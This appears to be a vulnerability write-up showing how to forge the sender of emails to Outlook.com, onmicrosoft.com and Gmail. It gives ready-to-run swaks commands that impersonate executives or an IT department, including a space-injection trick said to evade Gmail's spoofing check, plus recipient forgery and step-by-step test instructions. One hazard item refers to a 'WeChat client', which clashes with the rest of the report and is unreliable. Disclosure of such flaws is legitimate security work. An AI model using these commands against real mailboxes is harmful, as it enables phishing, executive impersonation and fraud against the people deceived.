

## Email sender forgery

### Description

Three Microsoft email services contain sender spoofing vulnerabilities.

Microsoft Exchange Online and Outlook clients have vulnerabilities in parsing and displaying the headers of incoming emails. Attackers can use tools like swaks to construct SMTP transactions with specific formats, bypassing traditional spoofing detection (SPF alignment checks) and visual security indicators. Sender spoofing against outlook.com and onmicrosoft.com can be directly achieved using swaks.

Gmail cannot directly spoof the sender using swaks, but adding spaces to the sender and email can bypass detection for gmail.com. The root cause appears to be a difference in how email gateways and email clients handle spaces or specific characters (e.g., `fromadmin@ gmail.com`) in email headers.

It's possible that after injecting spaces, the gateway cannot correctly extract the domain name to compare with internally protected domains.

The Gmail client displays a spoofed "display name" and "spoofed email," but does not display "external" or "unverified" warnings, leading users to mistakenly believe the email originated from a trusted internal or official source.

Recipient forgery can also be achieved by modifying the `to recipient` field in the email3.txt file of the data file.

### Outlook

```
swaks --to xx@outlook.com --from youname@email.com --h-From: '汪主管<admin@outlook.com>'  --ehlo outlook.com --server smtpdm.email.com -p 25 -au yourname  -ap smtp_passwed -data @email3.txt
```

email3.txt

![image-20251221162654611](Microsoft_mailspoff.assets/image-20251221162654611.png) 

![image-20251221164927906](Microsoft_mailspoff.assets/image-20251221164927906.png) 

View the received emails in the Outlook client (depending on the email content, they may be categorized as spam).



![image-20251221162359487](Microsoft_mailspoff.assets/image-20251221162359487.png) 

 

### Onmicrosoft

```
swaks --to xx@onmicrosoft.com --from youname@email.com --h-From: '汪主管<admin@onmicrosoft.com>'  --ehlo onmicrosoft.com --server smtpdm.email.com -p 25 -au yourname  -ap smtp_passwd -data @email3.txt
```

![image-20251221163212422](Microsoft_mailspoff.assets/image-20251221163212422.png) 

email3.txt

![image-20251221162654611](Microsoft_mailspoff.assets/image-20251221162654611.png) 



![image-20251221162940840](Microsoft_mailspoff.assets/image-20251221162940840.png) 

### gmail

#### Sender forgery

```c
#Based on the email gateway's identification logic, directly add spaces to bypass the detection logic =========
swaks --to cheatname@cheat.com --from yourname@youremail.com \
	--h-From: 'IT service department<IT @cheat.com >' --ehlo cheat.com --server smtp.youremail.com -p 25 -au yourname@youremail.com -ap smtp authorization code -data @email2.txt
```

![image-20251221160846062](Microsoft_mailspoff.assets/image-20251221160846062.png) 

By modifying email2.txt, any recipient, including recipient groups (such as staff), can be forged, thus achieving recipient spoofing.

![image-20251221160710272](Microsoft_mailspoff.assets/image-20251221160710272.png)   

- This successfully exploits a sender identification error by the email gateway, causing it to malfunction. The suspected email gateway identification logic is as follows:

  - Retrieve the senderDomain of the email

  - Retrieve the email address from the sender's field

  - Check if the email address matches a built-in company email address. If they match, check the senderDomain. If a fake company domain is found, it's marked as "sender Spoofed" and the email is rejected. However, the gateway cannot handle spaces when identifying the sender's email address. `IT @cheat.com` directly prevents the gateway from retrieving the email address from the sender's field, thus failing to perform a comparison with the senderDomain and generating an anomaly (which naturally skips the detection logic). Alternatively, it might detect string inclusion (**empty strings `""` are considered substrings of any string**), thus assuming the email's sender domain is internal, ultimately failing to identify the email as a phishing email.



#### Usage

```
swaks --to xx@gmail.com --from youname@email.com --h-From: '汪主管<admin@ gmail.com>'  --ehlo gmail.com --server smtpdm.email.com -p 25 -au yourname  -ap smtp_passwd -data @email3.txt
```

![image-20251221164050973](Microsoft_mailspoff.assets/image-20251221164050973.png) 


![image-20251221163809012](Microsoft_mailspoff.assets/image-20251221163809012.png) 

![image-20251221170141157](Microsoft_mailspoff.assets/image-20251221170141157.png) 

### Remarks

#### Hazard Description:

1. Sender Identity Forgery: Attackers can arbitrarily forge sender email addresses, including impersonating company executives, business partners, and other important identities, to carry out social engineering attacks.

2. Phishing Attack Risk: By forging a trusted sender to send phishing emails, attackers can trick users into clicking malicious links or downloading malicious attachments, potentially leading to account theft and leakage of sensitive information.

3. Internal Fraud: Attackers can forge emails from internal management personnel, requesting employees to transfer money, provide sensitive data, or perform malicious operations, causing economic losses to the company.

4. Trust Abuse: Because the WeChat client lacks security alerts, users cannot distinguish between genuine and fake emails, completely undermining the email system's authentication mechanism.

5. Expanded Attack Surface: Attackers can exploit this vulnerability in combination with other attack methods to form a complete attack chain.

#### Test Steps:

1. Prepare the forged email: Use the swaks tool or a self-built SMTP client to construct an email containing forged sender information.

2. Configure the email content: Write the email content in email3.txt, setting the recipient, subject, body, etc.

3. Send the email: Send the email through the specified SMTP server (smtpdm.email.com), using the forged sender address.
